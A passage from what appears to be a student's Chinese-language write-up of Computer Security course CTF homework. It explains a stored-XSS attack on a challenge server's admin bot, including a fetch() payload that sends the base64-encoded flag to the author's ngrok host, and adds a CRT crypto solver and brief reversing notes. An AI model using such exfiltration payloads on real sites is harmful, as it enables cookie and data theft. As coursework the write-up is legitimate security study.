class="comment">// URL to send the base64-encoded flag to example.com</span></span><br><span class="line">    <span class="keyword">const</span> postURL = <span class="string">`https://db7c-61-231-76-171.ngrok-free.app/ <span class="subst">$&#123;base64Flag&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Headers for the POST request to example.com</span></span><br><span class="line">    <span class="keyword">const</span> postHeaders = &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Data to send in the POST request</span></span><br><span class="line">    <span class="keyword">const</span> postData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">flag</span>: base64Flag &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send the POST request to example.com</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fetch</span>(postURL, &#123; <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">headers</span>:    postHeaders, <span class="attr">body</span>: postData &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">postResponse</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (postResponse.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Flag sent successfully to example.com&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Failed to send flag to example.com&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error.<span class="property">message</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>這邊來釐清一下整題挑戰的架構，順便說明我怎麼做解題。</p>
<p>整題的架構大致上如下：</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%871.JPG"></p>
<p>主要就是有 “CTF challenge server” 、 “My Python Flask backend” 以及 “My browser” 三個角色，又 “My Python Flask backend” 和 “My browser” 可以在同一臺電腦主機上。</p>
<p>第 1 步就是以 “My browser” 開啟挑戰頁面去註冊 “My Python Flask backend” 的網址，這個步驟遇到兩個問題，第一，我沒有自己的公開網址，這個可以用 <code>ngrok</code> 來解決；第二，要去註冊前好像會 check cookie ，這個在 browser console 下 <code>document.cookie=&quot;authentication=authentication&quot;</code> 應該就可以解決了。</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%872.JPG"></p>
<p>第 2 步， “CTF challenge server” 在收到註冊訊息時，會先與 “My Python Flask backend” 做一些互動並且驗證，且成功時 “My browser” 會收到一個 ID 。</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%873.JPG"></p>
<p>第 3 步，這個步驟只是在說明為甚麼這時候的 “My browser” 會之到 ID 以及其中一個一定存在的 Alias 。</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%874.JPG"></p>
<p>第 4 步開始會有兩個分支，我後續會分別稱他們為 GET 分支以及 POST 分支。</p>
<p>第 4 步 ( GET 分支 ) ，用 “My browser” 來傳送請求，請求使用 <code>GET</code> 並且訪問 <code>/&lt;ID&gt;/&lt;Alias&gt;</code> 。之後會發現走這個分支的話會比較好 DEBUG 自己的寫的 XSS payload ，因為執行 XSS 的地方應該是 “My browser” ，這樣一來就可以從 console 來查看錯誤訊息，這個可以從後續的流程中看出。</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%875.JPG"></p>
<p>第 5 步 ( GET 分支 ) ， “CTF challenge server” 會根據 ID 把 <code>/&lt;Alias&gt;</code> 請求傳給 “My Python Flask backend” ，具體程式碼是參考 <code>app.js</code> 裡的內容如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:id/:alias&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id, alias &#125; = req.<span class="property">params</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">GUSPServices</span>.<span class="title function_">has</span>(id)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;API not found&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; url, javascript &#125; = <span class="title class_">GUSPServices</span>.<span class="title function_">get</span>(id);</span><br><span class="line">    <span class="title function_">fetch</span>(url + <span class="string">&#x27;/&#x27;</span> + alias, &#123; <span class="attr">redirect</span>: <span class="string">&#x27;manual&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (r.<span class="property">status</span> !== <span class="number">302</span>) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Alias not found&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> originalUrl = r.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Location&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`&lt;script&gt;</span></span><br><span class="line"><span class="string">        const data = <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123; id, alias, originalUrl &#125;)&#125;</span>;</span></span><br><span class="line"><span class="string">        window.onload = () =&gt; &#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;javascript ? javascript :</span></span></span><br><span class="line"><span class="subst"><span class="string">                <span class="string">&#x27;window.location.href = data.originalUrl;&#x27;</span></span></span></span><br><span class="line"><span class="subst"><span class="string">            &#125;</span></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;`</span>);</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span></span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(err.<span class="property">message</span>)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上述 code 也順便說明了第 6 步 ( GET 分支 ) 中為何 “My Python Flask backend” 需要回傳 302 狀態碼，所以我就不多解釋第 6 步 ( GET 分支 ) 了 ~</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%876.JPG"></p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%877.JPG"></p>
<p>第 7 步 ( GET 分支 ) ，這步只是說明會將訊息傳回 “My browser” 。</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%878.JPG"></p>
<p>第 8 步 ( GET 分支 ) ，當訊息傳回 “My browser” 且更早之前有利用 XSS 漏洞安插 payload ，那該 payload 將會在 “My browser” 上執行！不過這個題目是要去拿到 “CTF challenge server” 的 flag ，而這只有 “CTF challenge server” 自己才能做到，所以現在目標就是找到在 “CTF challenge server” 可以執行 XSS 的做法。</p>
<p>在之後的第 9 ~ 11 步 ( GET 分支 ) 只是大概演示走 GET 分支的結果。</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%879.JPG"></p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%8710.JPG"></p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%8711.JPG"></p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%8712.JPG"></p>
<p>第 4 步 ( POST 分支 ) ，這次嘗試用 POST 且附帶 data 去戳 “CTF challenge server” 的 <code>/report</code> 。</p>
<p>至於為甚麼要戳 <code>/report</code> ，以及 “CTF challenge server” 會怎麼處理這個請求，可以從 <code>app.js</code> 的內容去分析：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// make the bot visit the GUSP service with the given id and alias</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; id, alias &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">GUSPServices</span>.<span class="title function_">has</span>(id)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;API not found&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alias.<span class="title function_">match</span>(<span class="regexp">/[^A-Za-z0-9_-]/</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Invalid alias&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">visit</span>(id, alias);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Admin will check your report&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>由上述 code 可以知道要再去分析 <code>visit</code> 的 code ，如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// admin bot part</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">id, alias</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/<span class="subst">$&#123;id&#125;</span>/<span class="subst">$&#123;alias&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>()</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>()</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[+] error visting <span class="subst">$&#123;path&#125;</span>`</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">await</span> context.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>這邊我理解成 “CTF challenge server” 自己模擬成一個 browser 去向 “My Python Flask backend” 做請求，這樣就會代表之後 “CTF challenge server” 所模擬的 browser 就會執行 XSS 進而抓取 flag ，而當我們把 flag 加在網址後面再送請求到 “My Python Flask backend” 時，就可以從 “My Python Flask backend” 的 log message 裡找到 flag ！而這也就是第 4 ~ 7 步 ( POST 分支 ) 所做的事情。</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%8713.JPG"></p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%8714.JPG"></p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%8715.JPG"></p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/webgusp/%E6%8A%95%E5%BD%B1%E7%89%8716.JPG"></p>
<h1 id="HW0-Extreme-Xorrrrr-20"><a href="#HW0-Extreme-Xorrrrr-20" class="headerlink" title="HW0, Extreme Xorrrrr, 20"></a>HW0, Extreme Xorrrrr, 20</h1><p>首先要利用 xor 同樣的值兩次之後會變回自己，這樣我們可以對題目給的提示去做一遍 <code>xorrrrr</code> ，再來就是觀察題目可以看到類似於 CRT 的形式的算式，不過需要做一點處理也就是先乘上模反元素，這樣一來就得到一個可以用 CRT 來解決的算式，以下是我的作法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, inverse</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorrrrr</span>(<span class="params">nums</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(nums)</span><br><span class="line">    result = [<span class="number">0</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">        result = [ result[j] ^ nums[(j+i) % n] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span></span><br><span class="line">secret = bytes_to_long(flag)</span><br><span class="line">mods = [ getPrime(<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">muls = [ getPrime(<span class="number">20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mods)</span><br><span class="line"><span class="built_in">print</span>(muls)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Real secret:&quot;</span>, secret)</span><br><span class="line"></span><br><span class="line">hint = [secret * muls[i] % mods[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;hint:\n&quot;, hint)</span></span><br><span class="line"><span class="comment"># print(&quot;xorrrrr(hint):\n&quot;, xorrrrr(hint))</span></span><br><span class="line"><span class="comment"># print(&quot;xorrrrr(xorrrrr(hint)):\n&quot;, xorrrrr(xorrrrr(hint)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># inv_muls = [inverse(mul, mod) for mul, mod in zip(muls, mods)]</span></span><br><span class="line"><span class="comment"># print(&quot;inv_muls:\n&quot;, inv_muls)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># crt_m_v = crt(mods, [x * y for x, y in zip(hint, inv_muls)])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = hex(crt_m_v[0])</span></span><br><span class="line"><span class="comment"># if len(s) % 2 == 1:</span></span><br><span class="line"><span class="comment">#     s = s.replace(&quot;0x&quot;, &quot;0&quot;)</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     s = s.replace(&quot;0x&quot;, &quot;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;secret? :&quot;, bytes.fromhex(s))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f&quot;hint = &#123;xorrrrr(xorrrrr(hint))&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;muls = &#123;xorrrrr(xorrrrr(muls))&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;mods = &#123;xorrrrr(xorrrrr(mods))&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint = [297901710, 2438499757, 172983774, 2611781033, 2766983357, 1018346993, 810270522, 2334480195, 154508735, 1066271428, 3716430041, 875123909, 2664535551, 2193044963, 2538833821, 2856583708, 3081106896, 2195167145, 2811407927, 3794168460]</span></span><br><span class="line"><span class="comment"># muls = [865741, 631045, 970663, 575787, 597689, 791331, 594479, 857481, 797931, 1006437, 661791, 681453, 963397, 667371, 705405, 684177, 736827, 757871, 698753, 841555]</span></span><br><span class="line"><span class="comment"># mods = [2529754263, 4081964537, 2817833411, 3840103391, 3698869687, 3524873305, 2420253753, 2950766353, 3160043859, 2341042647, 4125137273, 3875984107, 4079282409, 2753416889, 2778711505, 3667413387, 4187196169, 3489959487, 2756285845, 3925748705]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># here for real flag</span></span><br><span class="line"></span><br><span class="line">hint = [<span class="number">297901710</span>, <span class="number">2438499757</span>, <span class="number">172983774</span>, <span class="number">2611781033</span>, <span class="number">2766983357</span>, <span class="number">1018346993</span>, <span class="number">810270522</span>, <span class="number">2334480195</span>, <span class="number">154508735</span>, <span class="number">1066271428</span>, <span class="number">3716430041</span>, <span class="number">875123909</span>, <span class="number">2664535551</span>, <span class="number">2193044963</span>, <span class="number">2538833821</span>, <span class="number">2856583708</span>, <span class="number">3081106896</span>, <span class="number">2195167145</span>, <span class="number">2811407927</span>, <span class="number">3794168460</span>]</span><br><span class="line">muls = [<span class="number">865741</span>, <span class="number">631045</span>, <span class="number">970663</span>, <span class="number">575787</span>, <span class="number">597689</span>, <span class="number">791331</span>, <span class="number">594479</span>, <span class="number">857481</span>, <span class="number">797931</span>, <span class="number">1006437</span>, <span class="number">661791</span>, <span class="number">681453</span>, <span class="number">963397</span>, <span class="number">667371</span>, <span class="number">705405</span>, <span class="number">684177</span>, <span class="number">736827</span>, <span class="number">757871</span>, <span class="number">698753</span>, <span class="number">841555</span>]</span><br><span class="line">mods = [<span class="number">2529754263</span>, <span class="number">4081964537</span>, <span class="number">2817833411</span>, <span class="number">3840103391</span>, <span class="number">3698869687</span>, <span class="number">3524873305</span>, <span class="number">2420253753</span>, <span class="number">2950766353</span>, <span class="number">3160043859</span>, <span class="number">2341042647</span>, <span class="number">4125137273</span>, <span class="number">3875984107</span>, <span class="number">4079282409</span>, <span class="number">2753416889</span>, <span class="number">2778711505</span>, <span class="number">3667413387</span>, <span class="number">4187196169</span>, <span class="number">3489959487</span>, <span class="number">2756285845</span>, <span class="number">3925748705</span>]</span><br><span class="line"></span><br><span class="line">hint = xorrrrr(hint)</span><br><span class="line">mods = xorrrrr(mods)</span><br><span class="line">muls = xorrrrr(muls)</span><br><span class="line"></span><br><span class="line">inv_muls = [inverse(mul, mod) <span class="keyword">for</span> mul, mod <span class="keyword">in</span> <span class="built_in">zip</span>(muls, mods)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;inv_muls:\n&quot;</span>, inv_muls)</span><br><span class="line"></span><br><span class="line">crt_m_v = crt(mods, [x * y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(hint, inv_muls)])</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">hex</span>(crt_m_v[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(s) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">    s = s.replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s = s.replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret? :&quot;</span>, <span class="built_in">bytes</span>.fromhex(s))</span><br></pre></td></tr></table></figure>

<h1 id="HW0-Baby-Crackme-10"><a href="#HW0-Baby-Crackme-10" class="headerlink" title="HW0, Baby Crackme, 10"></a>HW0, Baby Crackme, 10</h1><p>flag 會在執行過程中產生，動態檢查慢慢找即可。</p>
<h1 id="HW0-Easy-C2-10"><a href="#HW0-Easy-C2-10" class="headerlink" title="HW0, Easy C2, 10"></a>HW0, Easy C2, 10</h1><p>flag 會在執行過程中產生，但是前面會卡一個要我們建立連線的動作，直接用 <code>NOP</code> patch 掉，然後再動態檢查慢慢找即可。</p>
<h1 id="My-Submission"><a href="#My-Submission" class="headerlink" title="My Submission"></a>My Submission</h1><p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc3.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://sharkkcode.github.io">Sharkkcode</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://sharkkcode.github.io/2023/09/15/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-hw0/">https://sharkkcode.github.io/2023/09/15/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-hw0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/16/Randomized-Algorithms/"><img class="prev-cover" src="/img/wall.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Randomized Algorithms</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/15/Break-x86-ISA-Paper-Reading/"><img class="next-cover" src="/img/wall.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Break_x86_ISA_Paper_Reading</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/catcat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Sharkkcode</div><div class="author-info__description">Keep Learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sharkkcode"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">THIS IS MY BLOG~~~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-hw0"><span class="toc-number">1.</span> <span class="toc-text">程式安全 Computer Security 2023 FALL hw0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A0%E7%B0%BD%E8%B7%AF%E9%80%94%E4%B8%AD%E7%B6%93%E9%81%8E%E7%9A%84-XX-%E5%B0%8F%E5%BE%91"><span class="toc-number">2.</span> <span class="toc-text">加簽路途中經過的 XX 小徑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HW0-Baby-Hook-20"><span class="toc-number">3.</span> <span class="toc-text">HW0, Baby Hook, 20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HW0-GUSP-Hub-20"><span class="toc-number">4.</span> <span class="toc-text">HW0, GUSP Hub, 20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HW0-Extreme-Xorrrrr-20"><span class="toc-number">5.</span> <span class="toc-text">HW0, Extreme Xorrrrr, 20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HW0-Baby-Crackme-10"><span class="toc-number">6.</span> <span class="toc-text">HW0, Baby Crackme, 10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HW0-Easy-C2-10"><span class="toc-number">7.</span> <span class="toc-text">HW0, Easy C2, 10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#My-Submission"><span class="toc-number">8.</span> <span class="toc-text">My Submission</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/17/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-tool/" title="程式安全 Computer Security 2023 FALL tool"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="程式安全 Computer Security 2023 FALL tool"/></a><div class="content"><a class="title" href="/2023/09/17/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-tool/" title="程式安全 Computer Security 2023 FALL tool">程式安全 Computer Security 2023 FALL tool</a><time 